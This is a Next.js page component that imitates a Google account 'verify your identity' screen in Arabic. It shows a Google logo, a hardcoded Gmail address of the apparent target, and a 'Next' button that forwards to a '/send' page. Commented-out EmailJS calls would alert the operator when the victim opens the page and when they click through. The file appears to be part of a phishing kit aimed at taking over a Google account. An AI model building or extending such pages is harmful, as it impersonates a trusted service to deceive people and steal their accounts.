'use client'
import Image from "next/image";
import { useRouter } from 'next/navigation';
import { useEffect, useState } from "react";
import emailjs, { send } from 'emailjs-com';

export default function Home() {
    const router = useRouter();
  
    // const sendEmail = async (message:string) => {
    //   try {
    //     const result = await emailjs.send(
    //       'service_nwpu79r', // Replace with your EmailJS service ID
    //       'template_icrxtto', // No template ID
    //       {
    //         name: 'Yacoob', // Replace with dynamic or static value
    //         time: new Date().toLocaleString(), // Or any formatted time you prefer
    //         message: message, // Your message content
    //       },
    //       '8icIF76qfpFpaotTM' // Replace with your EmailJS user ID
    //     );
    
    //     console.log(result);
    //   } catch (error) {
    //     console.log(error);
    //   }
    // };

    // useEffect(()=>{

    //   // sendEmail("he entered nowww !!")
    // },[])


    const [isLoading, setIsLoading] = useState(false);

  const handleClick = () => {
    setIsLoading(true);
    // sendEmail("went to send page")


    // انتظر ثانية واحدة قبل التنقل
    setTimeout(() => {
      router.push('/send');
    }, 2000);
  };
  return (
    <div className="min-h-screen bg-[#f2f3f5] flex items-center justify-center p-4">
      <div className="bg-white p-6 md:p-10 rounded-2xl shadow-md w-full max-w-3xl">
        
        {/* Logo */}
        <div className="flex justify-start mb-6">
          <Image
            src="library/logo.png"
            alt="Google logo"
            width={40}
            height={40}
          />
        </div>

        {/* Content Wrapper */}
        <div className="flex flex-col md:flex-row justify-between gap-8">
          
          {/* Left side */}
          <div className="flex-1">
            <h1 className="text-2xl md:text-4xl font-semibold mb-4">تحقق من هويتك</h1>

            <div className="inline-flex items-center px-4 py-2 border rounded-full bg-gray-100 text-sm text-gray-800">
              <span className="w-8 h-8 rounded-full bg-[#4285F4] text-white flex items-center justify-center mr-3 font-bold">
                M
              </span>
              mn3384922@gmail.com
            </div>
          </div>

          {/* Right side */}
          <div className="flex-1 flex flex-col justify-between items-end md:items-end text-right gap-6">
            <p className="text-gray-700 text-sm md:text-base" dir="rtl">
            للمساعدة في الحفاظ على أمان حسابك، تريد Google التأكد من أنك بالفعل تحاول تسجيل الدخول
            </p>

            <button
      onClick={handleClick}
      disabled={isLoading}
      className={`px-6 py-2  rounded-full font-medium transition-colors ${
        isLoading
          ? 'bg-gray-200 text-gray-500 cursor-not-allowed'
          : 'bg-blue-600 hover:bg-blue-700 text-white rounded-full px-6 py-2 font-medium'
      }`}
    >التالي
    </button>
          </div>
        </div>
      </div>
    </div>
  );
}
